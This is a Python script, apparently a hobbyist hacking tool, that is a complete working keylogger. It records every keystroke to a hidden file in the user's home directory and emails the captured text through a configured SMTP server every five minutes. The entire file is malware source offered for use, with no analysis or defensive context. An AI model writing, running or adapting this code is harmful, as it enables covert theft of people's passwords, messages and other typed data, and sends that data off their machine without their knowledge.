#!/usr/bin/env python3

import os, smtplib, time, schedule, signal, sys
from datetime import datetime
from colorama import Fore, Style, Back
from pynput.keyboard import Listener
from threading import Timer
from dotenv import load_dotenv

if not os.path.exists('smtp.env'):
    print(f"{Fore.LIGHTRED_EX}{Style.BRIGHT}\n\n[!] Create a 'smtp.env' file with the SMTP server and credentials!\n{Style.RESET_ALL}")
    sys.exit(1)

load_dotenv('smtp.env')
listener = None
is_running = True

def def_handler(sig, frame):
    global is_running
    is_running = False
    try:
        handle_log()
        if os.path.exists(log_file):
            os.remove(log_file)
    except Exception:
        pass
    if listener:
        listener.stop()
    print(f"\n\n{Fore.RED}[!] Exiting...{Style.RESET_ALL}\n")
    sys.exit(0)

signal.signal(signal.SIGINT, def_handler)

EMAIL = os.getenv("EMAIL")
PASSWORD = os.getenv("PASSWORD")
SMTP_SERVER = os.getenv("SMTP_SERVER")
SMTP_PORT = os.getenv("SMTP_PORT")

missing_vars = []
if not EMAIL:
    missing_vars.append("EMAIL")
if not PASSWORD:
    missing_vars.append("PASSWORD")
if not SMTP_SERVER:
    missing_vars.append("SMTP_SERVER")
if SMTP_PORT is None:
    missing_vars.append("SMTP_PORT")

if missing_vars:
    print(f"{Fore.LIGHTRED_EX}{Style.BRIGHT}\n\n[!] The following variables are missing in 'smtp.env' file: {Style.RESET_ALL}{', '.join(missing_vars)}\n")
    sys.exit(1)

SMTP_PORT = int(SMTP_PORT) if SMTP_PORT is not None else None

log_file = os.path.join(os.path.expanduser("~"), ".hidden_log.txt")
send_interval = 300  # 5 minutes

def send_mail(log_content):
    try:
        server = smtplib.SMTP(SMTP_SERVER, SMTP_PORT)
        server.starttls()
        server.login(EMAIL, PASSWORD)
        message = f"From: keylogger@example.com\nTo: {EMAIL}\nSubject: Keylogger Log\n\n{log_content}"
        server.sendmail(EMAIL, EMAIL, message)
        server.quit()
        print(f"{Fore.LIGHTGREEN_EX+Style.BRIGHT}\n[+] Log sent successfully {Style.DIM}{Fore.LIGHTWHITE_EX}({datetime.now():%d/%m/%Y %H:%M:%S})")
    except Exception as e:
        print(f"[!] Error while sending mail: {e}")

def handle_log():
    if os.path.exists(log_file):
        with open(log_file, "r") as f:
            log_content = f.read()
        if log_content:
            send_mail(log_content)
        os.remove(log_file)

def record_keystroke(key):
    with open(log_file, "a") as f:
        try:
            f.write(f"{key.char}")
        except AttributeError:
            if key == key.space:
                f.write(" ")
            elif key == key.enter:
                f.write("\n")
            else:
                f.write(f" {str(key)} ")

schedule.every(send_interval).seconds.do(handle_log)

def run_program():
    while is_running:
        schedule.run_pending()
        time.sleep(1)

def start_keylogger():
    global listener
    listener = Listener(on_press=record_keystroke)
    listener.start()
    while is_running:
        listener.join(timeout=1)

if __name__ == "__main__":
    os.system("clear")
    print(f"{Fore.GREEN}{Style.BRIGHT}Made by OusCyb3rH4ck{Style.RESET_ALL}")
    print(f"{Fore.LIGHTYELLOW_EX+Style.DIM}\n[+] Keylogger started!\n{Style.RESET_ALL}")
    print(f"{Fore.CYAN}{Style.BRIGHT}{Back.BLACK}[-] Logs will be sent every 5 minutes...\n{Style.RESET_ALL}")
    Timer(1, run_program).start()
    start_keylogger()
